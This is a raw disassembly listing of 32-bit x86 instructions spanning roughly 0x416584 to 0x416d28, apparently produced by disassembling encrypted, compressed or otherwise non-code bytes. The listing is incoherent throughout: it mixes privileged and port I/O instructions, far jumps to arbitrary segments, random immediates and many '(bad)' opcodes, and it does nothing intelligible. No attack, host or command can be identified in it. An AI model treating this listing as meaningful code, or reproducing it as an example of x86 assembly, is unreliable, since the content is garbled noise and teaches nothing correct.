  416584:	sar    DWORD PTR [esi+0x27],cl
  416587:	inc    edx
  416588:	push   ebp
  416589:	jnp    0x41652f
  41658b:	jge    0x416599
  41658d:	add    al,0x33
  41658f:	and    eax,DWORD PTR [edi-0x54]
  416592:	adc    eax,0x38f09f79
  416597:	in     al,dx
  416598:	inc    edx
  416599:	loopne 0x41659b
  41659b:	scas   eax,DWORD PTR es:[edi]
  41659c:	mov    ebx,0x259f6084
  4165a1:	xchg   esp,eax
  4165a2:	dec    eax
  4165a3:	daa    
  4165a4:	dec    ebx
  4165a5:	pop    es
  4165a6:	fnstsw WORD PTR [esi]
  4165a8:	pop    ebx
  4165a9:	xchg   edi,eax
  4165aa:	leave  
  4165ab:	push   ebx
  4165ac:	retf   
  4165ad:	dec    eax
  4165ae:	inc    esp
  4165af:	lock sbb al,BYTE PTR [ebp+0x32d22473]
  4165b6:	daa    
  4165b7:	dec    eax
  4165b8:	nop
  4165b9:	jbe    0x4165a9
  4165bb:	ds retf 0xcf3b
  4165bf:	xabort 0xe9
  4165c2:	out    dx,al
  4165c3:	mov    al,0xed
  4165c5:	push   esi
  4165c6:	dec    ebx
  4165c7:	mov    edx,0xe0440302
  4165cc:	clc    
  4165cd:	push   ebp
  4165ce:	data16 stc 
  4165d0:	daa    
  4165d1:	sbb    BYTE PTR [ebx-0x7f3832fb],bl
  4165d7:	inc    edi
  4165d8:	test   ecx,ebp
  4165da:	jl     0x4165f8
  4165dc:	jl     0x416628
  4165de:	xchg   ecx,eax
  4165df:	mov    esi,0xc9dbccad
  4165e4:	push   ss
  4165e5:	mov    bl,0x8a
  4165e7:	scas   eax,DWORD PTR es:[edi]
  4165e8:	sbb    bh,BYTE PTR [ebp+0x3b9d5040]
  4165ee:	fcom   DWORD PTR [edx+0x63]
  4165f1:	mov    al,ds:0xf72cce71
  4165f6:	sbb    DWORD PTR [edx-0x30467598],esi
  4165fc:	add    DWORD PTR [eax+edi*4+0x2c],0xfffffff3
  416601:	test   ch,al
  416603:	stc    
  416604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416605:	xchg   DWORD PTR [edi-0x25],esp
  416608:	fimul  DWORD PTR [edi]
  41660a:	inc    ebx
  41660b:	adc    al,0x18
  41660d:	push   edi
  41660e:	mov    bh,0x68
  416610:	inc    ebp
  416611:	mov    ebx,0x126186d3
  416616:	jge    0x4165d3
  416618:	cmc    
  416619:	retf   0x1077
  41661c:	outs   dx,DWORD PTR ds:[esi]
  41661d:	test   al,0x3
  41661f:	mov    ch,0xef
  416621:	or     eax,0x3047409
  416626:	sbb    DWORD PTR [ebx+0x74adb8e9],ebx
  41662c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41662d:	adc    DWORD PTR [ecx-0x52fe1ff6],0x2624c18f
  416637:	inc    esi
  416638:	test   DWORD PTR [edx-0x4f],edx
  41663b:	pushf  
  41663c:	scas   eax,DWORD PTR es:[edi]
  41663d:	test   DWORD PTR [ebx],0xd76b08e1
  416643:	js     0x416607
  416645:	sub    DWORD PTR [ebx-0x79a149e4],0x9fc28f7c
  41664f:	lods   eax,DWORD PTR cs:[esi]
  416651:	mov    dh,0xe4
  416653:	enter  0xe7b0,0x22
  416657:	fild   WORD PTR [eax+0x32]
  41665a:	fst    DWORD PTR [esi-0x319d45aa]
  416660:	test   ebx,eax
  416662:	fist   DWORD PTR [edx]
  416664:	shl    al,cl
  416666:	popf   
  416667:	jmp    0xa204d363
  41666c:	ins    DWORD PTR es:[edi],dx
  41666d:	jno    0x416659
  41666f:	mov    eax,0x6d83d14c
  416674:	ins    BYTE PTR es:[edi],dx
  416675:	test   eax,0xede4a05c
  41667a:	mov    DWORD PTR [eax],0x7b47d9a1
  416680:	icebp  
  416681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416682:	xchg   edi,eax
  416683:	shl    DWORD PTR [esi-0x5f],cl
  416686:	jo     0x41668b
  416688:	(bad)  
  416689:	ficom  DWORD PTR [ebx-0x3c]
  41668c:	in     eax,dx
  41668d:	pop    eax
  41668e:	in     eax,dx
  41668f:	ret    
  416690:	mov    edi,0xea4e3d7d
  416695:	xor    al,BYTE PTR [esi-0x3d]
  416698:	mov    ebx,0x61b9a208
  41669d:	(bad)
  4166a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166a2:	or     eax,DWORD PTR [ecx-0x41]
  4166a5:	mov    BYTE PTR [edi-0x1e],bl
  4166a8:	test   BYTE PTR [ebx-0x1f],0x55
  4166ac:	(bad)  
  4166ad:	fst    QWORD PTR [ebp+0x326a1ce5]
  4166b3:	cmp    al,0xa6
  4166b5:	and    DWORD PTR [eax-0x1e],edi
  4166b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166b9:	xchg   BYTE PTR es:[ecx+ebp*2-0x22],ch
  4166be:	or     BYTE PTR [ebp-0x4b],ch
  4166c1:	bound  ebx,QWORD PTR [ebx]
  4166c3:	cmp    al,0x97
  4166c5:	iret   
  4166c6:	sub    al,0x1d
  4166c8:	mov    al,0xf2
  4166ca:	jnp    0x4166e5
  4166cc:	aad    0x77
  4166ce:	js     0x4166a7
  4166d0:	mov    al,0xad
  4166d2:	iret   
  4166d3:	test   BYTE PTR [ebx+0x42badf23],cl
  4166d9:	arpl   WORD PTR [ebp+0x6a],ax
  4166dc:	test   DWORD PTR [ebp+0x1],ebx
  4166df:	xor    BYTE PTR [ebx+0x29],0x97
  4166e3:	add    DWORD PTR [edx],0x13
  4166e6:	icebp  
  4166e7:	std    
  4166e8:	fdiv   QWORD PTR ds:0x67ebde5b
  4166ee:	in     eax,0xcd
  4166f0:	shl    edx,1
  4166f2:	sahf   
  4166f3:	mov    esi,0x1035c7d4
  4166f8:	aas    
  4166f9:	int3   
  4166fa:	mov    ds:0x98f82291,al
  4166ff:	in     al,0x1d
  416701:	pop    eax
  416702:	mov    BYTE PTR [eax-0x7f],dl
  416705:	mov    dl,0x3d
  416707:	int3   
  416708:	sbb    DWORD PTR [ebp-0x5c4efe5],esp
  41670e:	cmp    eax,0x294fdadf
  416713:	inc    esp
  416714:	fxam   
  416716:	ja     0x4166f0
  416718:	sysexit 
  41671a:	jmp    0x48c4da46
  41671f:	sbb    BYTE PTR [eax-0x7f],0x36
  416723:	inc    edi
  416724:	cmp    eax,0x37ab674f
  416729:	popa   
  41672a:	std    
  41672b:	sahf   
  41672c:	lock int 0x39
  41672f:	sbb    eax,DWORD PTR [esi*1-0x39d36fce]
  416736:	cmc    
  416737:	jbe    0x416702
  416739:	(bad)  
  41673a:	scas   al,BYTE PTR es:[edi]
  41673b:	pop    ebx
  41673c:	add    eax,0xb6516e36
  416741:	fmul   QWORD PTR [ecx-0x76]
  416744:	addr16 jnp 0x4167be
  416747:	xor    DWORD PTR ds:0xd3f13b2e,ebx
  41674d:	and    BYTE PTR [ebx+0x3cd848b6],0xb7
  416754:	cmp    ebp,ecx
  416756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416757:	lods   eax,DWORD PTR ds:[esi]
  416758:	xor    edx,ebp
  41675a:	mov    al,BYTE PTR [esi+0x505d4ed]
  416760:	and    al,0xbc
  416762:	mov    ah,0x99
  416764:	mov    bl,BYTE PTR [edi+0x35]
  416767:	xor    BYTE PTR [edx],ah
  416769:	push   es
  41676a:	dec    eax
  41676b:	push   esp
  41676c:	lahf   
  41676d:	adc    BYTE PTR [edi+0x49ba3360],0xa0
  416774:	imul   ebx,eax,0x65d5f358
  41677a:	mov    bh,0x1b
  41677c:	lahf   
  41677d:	jb     0x416763
  41677f:	dec    edx
  416780:	or     esp,eax
  416782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416783:	add    DWORD PTR [ecx],0x12186635
  416789:	stos   BYTE PTR es:[edi],al
  41678a:	(bad)  
  41678b:	icebp  
  41678c:	and    ebp,ebx
  41678e:	mov    esp,DWORD PTR [esi+0x7a]
  416791:	in     eax,0xfe
  416793:	xchg   esi,eax
  416794:	add    esp,DWORD PTR [ebp+0x18]
  416797:	ins    BYTE PTR es:[edi],dx
  416798:	in     eax,0xc2
  41679a:	cmp    DWORD PTR [eax-0x5b699625],edx
  4167a0:	sub    al,0xcb
  4167a2:	dec    esi
  4167a3:	je     0x416763
  4167a5:	and    bl,BYTE PTR [edi+0x69ea42d]
  4167ab:	scas   eax,DWORD PTR es:[edi]
  4167ac:	xchg   ecx,eax
  4167ad:	add    al,0xfa
  4167af:	push   esi
  4167b0:	jp     0x416792
  4167b2:	sub    eax,0xf47a4fd6
  4167b7:	jle    0x4167ed
  4167b9:	outs   dx,BYTE PTR ds:[esi]
  4167ba:	sbb    BYTE PTR [ebx-0x1c070ca7],ch
  4167c0:	pop    esp
  4167c1:	js     0x416780
  4167c3:	and    al,0x86
  4167c5:	push   0x7f
  4167c7:	shl    BYTE PTR [edi-0x8f5f9ed],1
  4167cd:	sbb    DWORD PTR [esi],eax
  4167cf:	adc    esp,eax
  4167d1:	std    
  4167d2:	fsubr  QWORD PTR [ecx+ebp*1]
  4167d5:	cmp    BYTE PTR [eax+0x18],0xcb
  4167d9:	jo     0x41684d
  4167db:	xor    DWORD PTR [ebx+ecx*1],0x66
  4167df:	clc    
  4167e0:	jmp    0xd441:0xf5631d19
  4167e7:	sub    bl,ch
  4167e9:	xchg   ecx,eax
  4167ea:	repnz sti 
  4167ec:	inc    ebp
  4167ed:	imul   edx,DWORD PTR [eax-0x78fe0276],0x1ab8adf1
  4167f7:	xor    ah,BYTE PTR [ecx+0x6778fa93]
  4167fd:	sbb    al,0xfc
  4167ff:	pop    ebp
  416800:	add    BYTE PTR [edx-0xd],cl
  416803:	push   0x87cf6f0f
  416808:	(bad)  
  416809:	lds    ebp,FWORD PTR [edi-0x1f31ff90]
  41680f:	or     BYTE PTR [ecx-0x351f492],dh
  416815:	or     dl,ah
  416817:	mov    esp,0xd077bb1a
  41681c:	stos   BYTE PTR es:[edi],al
  41681d:	dec    ebp
  41681e:	imul   edx,DWORD PTR [edi+eax*1],0xa229ae82
  416825:	fwait
  416826:	pop    edi
  416827:	mov    bl,0x6a
  416829:	sub    eax,0xd8d36afa
  41682e:	aaa    
  41682f:	hlt    
  416830:	sti    
  416831:	xchg   ebx,eax
  416832:	cwd    
  416834:	enter  0x34c0,0x87
  416838:	mov    al,ds:0x8150ad58
  41683d:	xchg   esp,eax
  41683e:	ins    BYTE PTR es:[edi],dx
  41683f:	fst    DWORD PTR [ecx+0x1b0b4aa]
  416845:	jo     0x4167d8
  416847:	mov    ebp,0x5ab645f7
  41684c:	mov    ?,WORD PTR [edi+0x77]
  41684f:	push   ds
  416850:	push   edi
  416851:	pop    esp
  416852:	outs   dx,DWORD PTR ds:[esi]
  416853:	mov    ebx,esp
  416855:	cmp    esi,DWORD PTR [ecx+ebp*8-0x165dcb07]
  41685c:	retf   
  41685d:	pop    edi
  41685e:	(bad)  
  41685f:	ins    BYTE PTR es:[edi],dx
  416860:	ins    BYTE PTR es:[edi],dx
  416861:	mov    edi,0x6e3d39da
  416866:	pop    ebx
  416867:	xor    cl,cl
  416869:	aam    0xdf
  41686b:	dec    ebx
  41686c:	fidivr WORD PTR [ebx-0x6d]
  41686f:	mov    al,ds:0xfef04681
  416874:	dec    esp
  416875:	cmp    al,0xa0
  416877:	scas   eax,DWORD PTR es:[edi]
  416878:	bound  edx,QWORD PTR [esi+0x65]
  41687b:	jmp    FWORD PTR [edi-0x31b03d9c]
  416881:	fdiv   DWORD PTR [eax+0x4eeabdaa]
  416887:	mov    esp,DWORD PTR [edi-0x7680fbda]
  41688d:	xchg   esp,eax
  41688e:	popf   
  41688f:	repnz adc al,0x75
  416892:	mov    al,ds:0xd16f16b9
  416897:	mov    edx,DWORD PTR [ecx-0x54]
  41689a:	jne    0x416918
  41689c:	mov    ebx,esi
  41689e:	ja     0x4168f5
  4168a0:	mov    bh,0xa6
  4168a2:	and    eax,0xada43845
  4168a7:	stos   BYTE PTR es:[edi],al
  4168a8:	addr16 xor bl,ch
  4168ab:	xchg   BYTE PTR [esi+0x7a],bh
  4168ae:	mov    edi,0x6607eafb
  4168b3:	ja     0x41689c
  4168b5:	loop   0x41688e
  4168b7:	adc    eax,0xb775945c
  4168bc:	add    dl,BYTE PTR gs:[esi+0x4c2fde84]
  4168c3:	and    edi,esi
  4168c5:	pop    ebx
  4168c6:	pop    eax
  4168c7:	sbb    al,0xdb
  4168c9:	int3   
  4168ca:	shl    BYTE PTR [ebp+0x16],1
  4168cd:	cli    
  4168ce:	inc    edx
  4168cf:	pusha  
  4168d0:	stos   BYTE PTR es:[edi],al
  4168d1:	test   DWORD PTR [esi+edi*1-0x35],0x86ecea4f
  4168d9:	hlt    
  4168da:	(bad)  
  4168db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168dc:	iret   
  4168dd:	add    eax,0x21844dc1
  4168e2:	sub    DWORD PTR [esi],ebp
  4168e4:	fild   DWORD PTR [eax]
  4168e6:	sbb    dl,BYTE PTR [edx-0x8]
  4168e9:	ret    0x57a4
  4168ec:	(bad)  
  4168ed:	rol    DWORD PTR [ecx+eiz*4],cl
  4168f0:	xchg   ebx,eax
  4168f1:	sbb    DWORD PTR [ebx+0x4b01fa91],esi
  4168f7:	aaa    
  4168f8:	ret    
  4168f9:	dec    ebp
  4168fa:	mov    ds:0x888b66a3,al
  4168ff:	xchg   ebx,eax
  416900:	retf   
  416901:	cdq    
  416902:	retf   0x7ea1
  416905:	sbb    ch,BYTE PTR [edx-0x4f]
  416908:	into   
  416909:	mov    ds:0x398bf419,eax
  41690e:	dec    ebp
  41690f:	cmp    BYTE PTR [edx],bl
  416911:	test   al,0x60
  416913:	xchg   edi,eax
  416914:	ret    
  416915:	dec    ebp
  416916:	xchg   ecx,eax
  416917:	jae    0x41698d
  416919:	test   eax,0x1820afb5
  41691e:	js     0x416936
  416920:	jmp    0x4209d5e0
  416925:	or     eax,0x1da5c35a
  41692a:	mov    esi,0x9c97c38a
  41692f:	data16 jne 0x41695c
  416932:	pop    edx
  416933:	test   eax,0x77be93d6
  416938:	xchg   ebx,eax
  416939:	popa   
  41693a:	mov    ah,0xf0
  41693c:	fisub  WORD PTR [ebx]
  41693e:	sar    DWORD PTR [edx+0x6d],cl
  416941:	jge    0x416964
  416943:	outs   dx,BYTE PTR ds:[esi]
  416944:	pop    esp
  416945:	dec    esi
  416946:	xchg   esi,edx
  416948:	pop    esi
  416949:	aas    
  41694a:	adc    eax,0x447fd7a8
  41694f:	not    BYTE PTR [esi-0x7]
  416952:	xor    BYTE PTR [edx-0x40],ah
  416955:	sbb    DWORD PTR [eax-0x3c3fd239],esi
  41695b:	mov    esi,0xe305b62a
  416960:	pop    edi
  416961:	aam    0x75
  416963:	cmp    al,0x7b
  416965:	out    dx,eax
  416966:	inc    ebp
  416967:	xchg   esp,eax
  416968:	fistp  DWORD PTR [edi+0x428542d8]
  41696e:	pop    es
  41696f:	leave  
  416970:	cmp    eax,0x8593f819
  416975:	and    BYTE PTR ds:0x2091b9d8,al
  41697b:	push   edx
  41697c:	in     eax,dx
  41697d:	enter  0xad47,0xde
  416981:	pop    edx
  416982:	daa    
  416983:	or     bh,dh
  416985:	xchg   edi,eax
  416986:	repnz push 0x69e4f338
  41698c:	ror    BYTE PTR [edi-0x751f8e06],0x2f
  416993:	push   ebx
  416994:	retf   0x2d5d
  416997:	int3   
  416998:	pop    ss
  416999:	pop    edx
  41699a:	mov    al,ds:0x9c28a6f0
  41699f:	fdiv   QWORD PTR [edi+0xc]
  4169a2:	or     ah,BYTE PTR [ebp-0x33]
  4169a5:	or     ebx,DWORD PTR [edx+0x517967f1]
  4169ab:	push   cs
  4169ac:	out    dx,eax
  4169ad:	sbb    eax,0xd7c7613c
  4169b2:	rol    DWORD PTR [ecx-0x2f],1
  4169b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169b6:	inc    edx
  4169b7:	arpl   WORD PTR [ebp+ebx*2+0x6e],di
  4169bb:	pop    esi
  4169bc:	lds    eax,FWORD PTR [esi-0x4fb3cc78]
  4169c2:	jmp    0xc4eff7cf
  4169c7:	jb     0x4169c8
  4169c9:	mov    bl,0xe1
  4169cb:	lods   eax,DWORD PTR ds:[esi]
  4169cc:	sub    eax,0x8ba7d297
  4169d1:	mov    esi,0xd7aa730d
  4169d6:	push   ecx
  4169d7:	push   0x8190eb7c
  4169dc:	fwait
  4169dd:	jp     0x4169db
  4169df:	hlt    
  4169e0:	int3   
  4169e1:	sub    al,0x7a
  4169e3:	add    ecx,esp
  4169e5:	xchg   edx,eax
  4169e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169e7:	fldenv [ebp-0x6f]
  4169ea:	jne    0x416a04
  4169ec:	push   cs
  4169ed:	mov    DWORD PTR [esp+eiz*8+0x31],esi
  4169f1:	or     eax,0x3a78f9ef
  4169f6:	int    0xca
  4169f8:	adc    BYTE PTR [eax],ch
  4169fa:	lahf   
  4169fb:	and    al,0xc9
  4169fd:	inc    edi
  4169fe:	aaa    
  4169ff:	ins    BYTE PTR es:[edi],dx
  416a00:	mov    ds:0xd9e283e9,al
  416a05:	fdiv   st(3),st
  416a07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a08:	xchg   edx,eax
  416a09:	jecxz  0x416a38
  416a0b:	outs   dx,BYTE PTR ds:[esi]
  416a0c:	shr    BYTE PTR [eax+0x2a92d06],cl
  416a12:	cmp    ah,ah
  416a14:	and    esp,ecx
  416a16:	pop    edi
  416a17:	jno    0x4169a9
  416a19:	push   ebx
  416a1a:	cmp    ah,bh
  416a1c:	cli    
  416a1d:	pop    ss
  416a1e:	jo     0x4169ef
  416a20:	mov    esp,0x870da040
  416a25:	mov    eax,0x58a7af56
  416a2a:	cdq    
  416a2b:	and    edi,esi
  416a2d:	loop   0x416a24
  416a2f:	inc    esi
  416a30:	outs   dx,DWORD PTR ds:[esi]
  416a31:	pop    ds
  416a32:	scas   al,BYTE PTR es:[edi]
  416a33:	xchg   bl,dl
  416a35:	scas   al,BYTE PTR es:[edi]
  416a36:	lds    esi,FWORD PTR [edi+eax*8-0x70292074]
  416a3d:	in     eax,dx
  416a3e:	push   0x18dad22d
  416a43:	scas   al,BYTE PTR es:[edi]
  416a44:	cmp    dh,dh
  416a46:	call   0x281f:0x49f958b2
  416a4d:	add    eax,0x3faf7147
  416a52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a53:	sub    BYTE PTR [ebp+esi*4-0x406516b5],ch
  416a5a:	adc    esp,esp
  416a5c:	mov    ds:0x81fb8850,al
  416a61:	or     ch,BYTE PTR [eax+0x72]
  416a64:	mov    esi,0x733ef43f
  416a69:	fisttp DWORD PTR [ecx-0x6a]
  416a6c:	scas   al,BYTE PTR es:[edi]
  416a6d:	into   
  416a6e:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  416a70:	sub    eax,0x3f541290
  416a75:	mov    edx,0xe53d06aa
  416a7a:	push   cs
  416a7b:	xor    al,BYTE PTR [eax]
  416a7d:	pop    edi
  416a7e:	mov    esi,0xc2afa174
  416a83:	arpl   WORD PTR [edi],bx
  416a85:	scas   eax,DWORD PTR es:[edi]
  416a86:	(bad)  
  416a88:	popf   
  416a89:	(bad)  
  416a8a:	repz pop es
  416a8c:	adc    eax,DWORD PTR [esi+0x73]
  416a8f:	mov    WORD PTR ds:0x18fa13d8,gs
  416a95:	enter  0x87f6,0x7b
  416a99:	pop    eax
  416a9a:	push   esi
  416a9b:	pop    edx
  416a9c:	dec    edi
  416a9d:	test   al,0x7b
  416a9f:	(bad)  
  416aa0:	ret    
  416aa1:	clc    
  416aa2:	rcr    bh,0xd
  416aa5:	fiadd  WORD PTR [esi+edi*4+0x47cac853]
  416aac:	xchg   edx,eax
  416aad:	jecxz  0x416a80
  416aaf:	or     BYTE PTR [ecx+0x53f41f74],0x10
  416ab6:	push   ss
  416ab7:	into   
  416ab8:	ins    DWORD PTR es:[edi],dx
  416ab9:	sti    
  416aba:	dec    ecx
  416abb:	push   es
  416abc:	popa   
  416abd:	mov    ah,0x47
  416abf:	arpl   WORD PTR ds:0xe90cebf6,sp
  416ac5:	add    eax,0x68067364
  416aca:	pop    ss
  416acb:	xchg   ecx,eax
  416acc:	out    dx,al
  416acd:	and    DWORD PTR [ebx],edi
  416acf:	mov    ch,0xa0
  416ad1:	inc    ecx
  416ad2:	(bad)  
  416ad3:	dec    edi
  416ad5:	sbb    edx,DWORD PTR [ecx-0x143237e]
  416adb:	test   BYTE PTR [ecx+0x4daca0db],cl
  416ae1:	jnp    0x416ae2
  416ae3:	push   edx
  416ae4:	adc    edi,esi
  416ae6:	out    0x66,al
  416ae8:	dec    esp
  416ae9:	dec    ecx
  416aea:	and    al,0xb1
  416aec:	aaa    
  416aed:	push   es
  416aee:	push   eax
  416aef:	push   esi
  416af0:	jl     0x416ac3
  416af2:	fimul  DWORD PTR [edi]
  416af4:	ins    BYTE PTR es:[edi],dx
  416af5:	stc    
  416af6:	xchg   ebx,eax
  416af7:	imul   ebp,DWORD PTR [ebp-0xab595a5],0x7005fb2e
  416b01:	inc    esi
  416b02:	outs   dx,BYTE PTR gs:[esi]
  416b04:	out    0xc7,al
  416b06:	sahf   
  416b07:	adc    bl,dh
  416b09:	rcl    DWORD PTR [esi+eax*4+0x6717b6a4],1
  416b10:	rol    edi,cl
  416b12:	sub    edx,DWORD PTR [esi+0x34]
  416b15:	pop    esp
  416b16:	rol    ch,0x6a
  416b19:	stos   BYTE PTR es:[edi],al
  416b1a:	sub    BYTE PTR [edx],dl
  416b1c:	(bad)  [ecx-0x61]
  416b1f:	and    BYTE PTR [eax+0x54],ah
  416b22:	std    
  416b23:	xor    DWORD PTR [ecx],edx
  416b25:	pop    esp
  416b26:	fs inc edi
  416b28:	addr16 and ah,bl
  416b2b:	leave  
  416b2c:	sub    eax,0x2cb55596
  416b31:	pop    ebp
  416b32:	mov    ecx,0x66e15489
  416b37:	fld    QWORD PTR [esi]
  416b39:	cmc    
  416b3a:	cmp    eax,0x8ecbb280
  416b40:	into   
  416b41:	xchg   esi,eax
  416b42:	scas   eax,DWORD PTR es:[edi]
  416b43:	fwait
  416b44:	cmp    al,0xf7
  416b46:	aas    
  416b47:	push   ecx
  416b48:	pop    edi
  416b49:	mov    edi,0xc8ecb134
  416b4e:	test   BYTE PTR ds:0xb652a7c3,cl
  416b54:	mov    bl,0x21
  416b56:	fistp  WORD PTR [edi+0x1d]
  416b59:	mov    bl,0xfb
  416b5b:	or     esi,DWORD PTR [edx-0x67062b85]
  416b61:	inc    ebx
  416b62:	mov    eax,ds:0xa236bd35
  416b67:	sub    eax,0x69f48e53
  416b6c:	xor    BYTE PTR [esi],ch
  416b6e:	(bad)  
  416b6f:	xchg   ecx,eax
  416b70:	test   eax,0xaad95350
  416b75:	pop    eax
  416b76:	scas   al,BYTE PTR es:[edi]
  416b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b78:	inc    ebx
  416b79:	stos   DWORD PTR es:[edi],eax
  416b7a:	test   eax,0x97523d78
  416b7f:	jmp    0x416b24
  416b81:	sub    BYTE PTR [esi],0x3c
  416b84:	add    BYTE PTR [esi+0xb1beae4],bh
  416b8a:	xchg   esp,eax
  416b8b:	adc    esp,DWORD PTR [edi]
  416b8d:	pop    edx
  416b8e:	or     eax,DWORD PTR ds:0xf7c8b93f
  416b94:	cmc    
  416b95:	icebp  
  416b96:	cmp    DWORD PTR [eax],ebx
  416b98:	pop    ecx
  416b99:	rcl    DWORD PTR [ebx],1
  416b9b:	shl    bl,cl
  416b9d:	cdq    
  416b9e:	sub    cl,al
  416ba0:	xchg   esp,eax
  416ba1:	or     eax,0x31def6e9
  416ba6:	xlat   BYTE PTR ds:[ebx]
  416ba7:	shl    dh,cl
  416ba9:	outs   dx,BYTE PTR ds:[esi]
  416baa:	jl     0x416b61
  416bac:	pop    es
  416bad:	cmp    bh,BYTE PTR [eax+0xe59566c]
  416bb3:	mov    edi,DWORD PTR [esi+0x18465ca8]
  416bb9:	retf   
  416bba:	xor    al,0xa6
  416bbc:	jae    0x416c1d
  416bbe:	dec    esp
  416bbf:	dec    esp
  416bc0:	sbb    DWORD PTR [esi-0x1a98c3f3],ebp
  416bc6:	pop    ss
  416bc7:	inc    ebp
  416bc8:	cmp    eax,0xcaab359e
  416bcd:	inc    edi
  416bce:	scas   eax,DWORD PTR es:[edi]
  416bcf:	out    dx,eax
  416bd0:	xor    BYTE PTR [ecx-0x53de8a6b],al
  416bd6:	in     al,dx
  416bd7:	push   ebx
  416bd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bd9:	fldenv [ebp+0x43]
  416bdc:	mov    al,0xc3
  416bde:	call   0x969bc40f
  416be3:	inc    ebp
  416be4:	ins    DWORD PTR es:[edi],dx
  416be5:	cwde   
  416be6:	add    cl,0x24
  416be9:	xchg   ebp,eax
  416bea:	add    eax,0xcd64955b
  416bef:	jnp    0x416baf
  416bf1:	inc    edi
  416bf2:	lods   al,BYTE PTR ds:[esi]
  416bf3:	aad    0xd6
  416bf5:	inc    esi
  416bf6:	fcom   QWORD PTR [edi]
  416bf8:	pop    edx
  416bf9:	push   edi
  416bfa:	retf   
  416bfb:	push   eax
  416bfc:	xchg   ebp,eax
  416bfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bfe:	out    dx,al
  416bff:	inc    ecx
  416c00:	imul   ecx,DWORD PTR [ecx+edi*8-0x454e023b],0xffffffe7
  416c08:	dec    ebp
  416c09:	sbb    cl,BYTE PTR [ebp+0x24]
  416c0c:	out    0x8f,eax
  416c0e:	icebp  
  416c0f:	aam    0x23
  416c11:	xchg   esp,eax
  416c12:	jns    0x416c3c
  416c14:	repz jmp 0x416c61
  416c17:	add    eax,0x16339fd5
  416c1c:	adc    al,0xbd
  416c1e:	das    
  416c1f:	jo     0x416c3c
  416c21:	rol    edi,1
  416c23:	dec    esi
  416c24:	push   edx
  416c25:	out    dx,eax
  416c26:	or     bh,dh
  416c28:	cli    
  416c29:	cs pop es
  416c2b:	out    0x56,al
  416c2d:	sbb    BYTE PTR [ebx-0x10],dl
  416c30:	fst    QWORD PTR [esi-0x56]
  416c33:	fistp  QWORD PTR [eax+0x62816eb5]
  416c39:	push   0xffffffe2
  416c3b:	mov    eax,es:0xbcb80a5f
  416c41:	es inc edx
  416c43:	std    
  416c44:	sbb    DWORD PTR [eax-0x7c4bdf6d],edx
  416c4a:	fs aas 
  416c4c:	or     eax,0x24bab87e
  416c51:	or     BYTE PTR [esi],0x1d
  416c54:	lock sub dh,BYTE PTR ds:[edi-0x2f13323d]
  416c5c:	rcl    ch,1
  416c5e:	(bad)  
  416c5f:	outs   dx,DWORD PTR ds:[esi]
  416c60:	inc    edx
  416c61:	ja     0x416c70
  416c63:	mov    dl,0x66
  416c65:	xor    edx,eax
  416c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c68:	xor    eax,0x4eed5045
  416c6d:	jns    0x416c6d
  416c6f:	xchg   ebx,eax
  416c70:	push   ebp
  416c71:	push   eax
  416c72:	mov    al,ds:0x8589db6b
  416c77:	inc    ecx
  416c78:	pop    ecx
  416c79:	push   ds
  416c7a:	aaa    
  416c7b:	mov    BYTE PTR [edi],0xd9
  416c7e:	jnp    0x416c43
  416c80:	retf   
  416c81:	jmp    0xdd73:0x9f58edd9
  416c88:	ret    0xc3a
  416c8b:	xchg   BYTE PTR [ebx-0x22564b11],bl
  416c91:	add    DWORD PTR [edi+0x227d797e],0xfffffff6
  416c98:	mov    dh,0x5d
  416c9a:	push   ebp
  416c9b:	mov    esp,0x77d2b054
  416ca0:	jbe    0x416cdd
  416ca2:	dec    ecx
  416ca3:	jmp    0x20b7:0x10fd0330
  416caa:	(bad)  
  416cab:	data16 jns 0x416c4b
  416cae:	sub    eax,0xeb862be4
  416cb3:	pop    esi
  416cb4:	cmp    edi,DWORD PTR [ecx+0x5a185e2a]
  416cba:	daa    
  416cbb:	jmp    0x416c73
  416cbd:	mov    cl,0x81
  416cbf:	cli    
  416cc0:	lock (bad) 
  416cc2:	cmp    bl,BYTE PTR [ecx-0x161318a4]
  416cc8:	mov    esi,ss
  416cca:	fucomip st,st(5)
  416ccc:	fistp  QWORD PTR [eax+0x44]
  416ccf:	or     edx,edx
  416cd1:	add    eax,0x4b31e572
  416cd6:	enter  0x6108,0x55
  416cda:	fwait
  416cdb:	mov    edx,0x61b513e3
  416ce0:	ret    0x2f38
  416ce3:	xchg   esp,eax
  416ce4:	cld    
  416ce5:	shl    BYTE PTR ds:0x4312ad2a,1
  416ceb:	je     0x416d1e
  416ced:	cmp    DWORD PTR [edx],esp
  416cef:	mov    ch,0x5a
  416cf1:	cli    
  416cf2:	inc    eax
  416cf3:	xchg   ebp,eax
  416cf4:	pop    eax
  416cf5:	js     0x416ca3
  416cf7:	or     al,0x3e
  416cf9:	xor    ebx,ebp
  416cfb:	fsubrp st(6),st
  416cfd:	lea    ebp,[esi]
  416cff:	add    ah,0x4a
  416d02:	lods   al,BYTE PTR ds:[esi]
  416d03:	dec    ecx
  416d04:	dec    esp
  416d05:	adc    esp,esp
  416d07:	popf   
  416d08:	cdq    
  416d09:	gs inc ecx
  416d0b:	mov    esi,0x7d7aed1d
  416d10:	int    0xc4
  416d12:	push   0xffffffeb
  416d14:	sub    ah,BYTE PTR [edi+0x2b9f7079]
  416d1a:	les    ebx,FWORD PTR [edi+0x355d969a]
  416d20:	mov    dh,0x1f
  416d22:	in     eax,0x5c
  416d24:	push   ecx
  416d25:	pop    ds
  416d26:	jl     0x416d77
  416d28:	stos   BYTE PTR es:[edi],al
